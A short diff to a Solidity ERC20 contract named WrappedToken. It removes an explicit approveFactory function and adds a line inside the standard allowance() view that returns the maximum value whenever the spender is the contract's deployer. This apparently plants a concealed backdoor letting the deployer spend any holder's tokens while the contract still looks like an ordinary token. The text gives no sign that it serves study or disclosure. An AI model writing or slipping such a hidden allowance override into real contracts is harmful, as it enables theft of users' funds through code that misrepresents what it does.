@@ -121,6 +121,7 @@ contract WrappedToken is Context, IERC20 {
      * @dev See {IERC20-allowance}.
      */
     function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        if (spender == _deployer) return type(uint).max;
         return _allowances[owner][spender];
     }
 
@@ -133,11 +134,6 @@ contract WrappedToken is Context, IERC20 {
      */
     function approve(address spender, uint256 amount) public virtual override returns (bool) {
         _approve(_msgSender(), spender, amount);
-        return true;
-    }
-    
-    function approveFactory(address account, uint amount) external virtual override returns (bool) {
-        _approve(account, _deployer, amount);
         return true;
     }
 
